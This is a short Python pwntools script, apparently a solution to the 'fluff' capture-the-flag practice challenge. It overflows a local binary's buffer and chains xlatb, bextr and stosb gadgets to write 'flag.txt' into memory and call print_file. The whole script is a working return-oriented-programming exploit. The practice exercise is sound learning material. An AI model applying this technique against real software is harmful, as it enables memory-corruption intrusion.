from pwn import *

data = 0x00601028 # rw-
print_file = 0x00400510 # plt
bextr = 0x0040062a # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
xlatb = 0x00400628 # xlatb ; ret
stosb = 0x00400639 # stosb byte ptr [rdi], al ; ret
pop_rdi = 0x004006a3 # pop rdi ; ret
filename = [ 0x4003c4, 0x4003c5, 0x40040c, 0x4003cf, 0x4003fd, 0x4003d8, 0x400248, 0x4003d8 ] # Addresses of bytes containing the characters needed

# Formatting filename for the ROP chains because of xlatb
# xlatb takes the bytes at [rbx+al], since al can't be initiliazed to zero for each iteration (because of size limit on the ROP chain), need to calculate the addresses depending on the value in al (previous char)
filename[0] -= 0xb # Value in al before the ROP chain starts
for i in range(1, len(filename)):
    filename[i] -= ord("flag.txt"[i-1])

# Overflow
payload = b"".join([
    b"A"*(32+8),
])

# Writing filename
for i in range(len(filename)):
    payload += b"".join([
        p64(bextr),
        p64(0x4000),
        p64(filename[i]-0x3ef2),
        p64(xlatb),
        p64(pop_rdi),
        p64(data+i),
        p64(stosb),
    ])

# Calling print_file
payload += b"".join([
    p64(pop_rdi),
    p64(data),
    p64(print_file),
])

p = process("./fluff")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
